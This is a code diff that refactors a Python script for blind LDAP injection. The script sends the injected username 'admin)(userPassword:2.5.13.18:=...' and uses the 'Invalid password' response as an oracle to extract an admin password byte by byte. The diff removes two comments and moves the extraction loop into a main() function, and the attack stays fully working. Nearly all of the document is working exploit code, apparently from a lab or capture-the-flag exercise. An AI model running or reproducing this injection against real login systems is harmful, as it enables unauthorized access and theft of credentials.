@@ -37,7 +37,6 @@ def send_request(username):
 
     try:
         r = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=5)
-        # check if invalid password which is our TRUE condition is triggered
         return "Invalid password" in r.text
     #if triggere Username not found FALSE
     except requests.RequestException:
@@ -53,30 +52,32 @@ def extract_byte(prefix):
         #inject into exploit string
         username = f"admin)(userPassword:2.5.13.18:={prefix}{escaped_byte}"
         if send_request(username):
-            #return the value that triggered TRUE condition
             return test_hex
     return None
 
 
-password_bytes = b""
-escaped_prefix = ""
-#I think that password cannot be longer than 100 chars :)
-for pos in range(1, 100):  
-    byte_value = extract_byte(escaped_prefix)
-    if byte_value is not None:
-        # Decrement TRUE hex by 1 to be conform with  
-        saved_byte_value = byte_value - 1
-        escaped_byte_for_prefix = f"\\{saved_byte_value:02x}"
-        escaped_prefix += escaped_byte_for_prefix
-        password_bytes += bytes([saved_byte_value])
-        char = chr(saved_byte_value)
-        print(f"Found byte {pos}: 0x{saved_byte_value:02x} ('{char}'); current payload suffix: {escaped_byte_for_prefix}")
-    else:
-        print(f"\nExtracted password in hex: {''.join([f'\\{b:02x}' for b in password_bytes])}")  # Display saved (decremented) bytes as escaped hex
-        break
+def main():
+    password_bytes = b""
+    escaped_prefix = ""
+    #I think that password cannot be longer than 100 chars :)
+    for pos in range(1, 100):  
+        byte_value = extract_byte(escaped_prefix)
+        if byte_value is not None:
+            # Decrement TRUE hex by 1 to be conform with  
+            saved_byte_value = byte_value - 1
+            escaped_byte_for_prefix = f"\\{saved_byte_value:02x}"
+            escaped_prefix += escaped_byte_for_prefix
+            password_bytes += bytes([saved_byte_value])
+            char = chr(saved_byte_value)
+            print(f"Found byte {pos}: 0x{saved_byte_value:02x} ('{char}'); current payload suffix: {escaped_byte_for_prefix}")
+        else:
+            print(f"\nExtracted password in hex: {''.join([f'\\{b:02x}' for b in password_bytes])}")  # Display saved (decremented) bytes as escaped hex
+            break
 
-try:
-    print(f"As string: {password_bytes.decode('utf-8')}")
-except UnicodeDecodeError:
-    print("Some bytes are not printable..?")
+    try:
+        print(f"As string: {password_bytes.decode('utf-8')}")
+    except UnicodeDecodeError:
+        print("Some bytes are not printable..?")
+
+main()
 
